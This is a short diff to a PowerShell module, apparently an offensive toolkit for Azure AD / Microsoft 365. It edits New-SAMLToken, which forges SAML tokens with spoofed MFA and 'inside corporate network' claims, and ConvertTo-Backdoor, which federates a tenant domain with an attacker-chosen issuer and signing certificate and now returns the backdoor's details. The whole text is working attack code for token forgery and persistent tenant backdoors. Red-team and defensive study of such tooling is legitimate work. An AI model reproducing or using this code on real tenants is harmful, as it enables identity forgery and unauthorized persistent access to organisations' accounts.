@@ -60,6 +60,9 @@ function New-SAMLToken
         [Parameter(Mandatory=$False)]
         [DateTime]$NotAfter,
 
+        [Parameter(Mandatory=$False)]
+        [guid]$DeviceIdentifier,
+
         [Parameter(ParameterSetName='UseAnySTS',Mandatory=$True)]
         [switch]$UseBuiltInCertificate,
 
@@ -125,7 +128,7 @@ function New-SAMLToken
             $statement.Attributes.Add((New-Object System.IdentityModel.Tokens.SamlAttribute("http://schemas.microsoft.com/claims","authnmethodsreferences",[string[]]@("http://schemas.microsoft.com/claims/multipleauthn"))))
         }
         # Inside company network
-        $statement.Attributes.Add((New-Object System.IdentityModel.Tokens.SamlAttribute("http://schemas.microsoft.com/ws/2012/01/","insidecorporatenetwork",[string[]]@("True"))))
+        $statement.Attributes.Add((New-Object System.IdentityModel.Tokens.SamlAttribute("http://schemas.microsoft.com/ws/2012/01","insidecorporatenetwork",[string[]]@("True"))))
         
         $statement.SamlSubject = $subject
 
@@ -715,7 +718,7 @@ function ConvertTo-Backdoor
                     New-Domain -AccessToken $AccessToken -Name $DomainName 
 
                     # We need to wait a while for the domain to be created..
-                    $seconds = 10
+                    $seconds = 15
                     $done = (Get-Date).AddSeconds($seconds)
                     while($done -gt (Get-Date)) {
                         $secondsLeft = $done.Subtract((Get-Date)).TotalSeconds
@@ -726,7 +729,9 @@ function ConvertTo-Backdoor
                     Write-Progress -Activity "Waiting" -Status "Waiting $seconds seconds for the domain to be ready..." -SecondsRemaining 0 -Completed
                 }
                 Set-DomainAuthentication -Authentication Federated -AccessToken $AccessToken -DomainName $DomainName -LogOffUri $LogOnOffUri -PassiveLogOnUri $LogOnOffUri -IssuerUri $IssuerUri -SigningCertificate $any_sts -SupportsMfa $true
-                Write-Host "Backdoor created. Domain: $DomainName, issuer=$IssuerUri" -ForegroundColor DarkBlue -BackgroundColor White
+                
+                Return New-Object PSObject -Property @{"Domain"=$DomainName; "IssuerUri" = $IssuerUri}
+                
             }
 
             default {
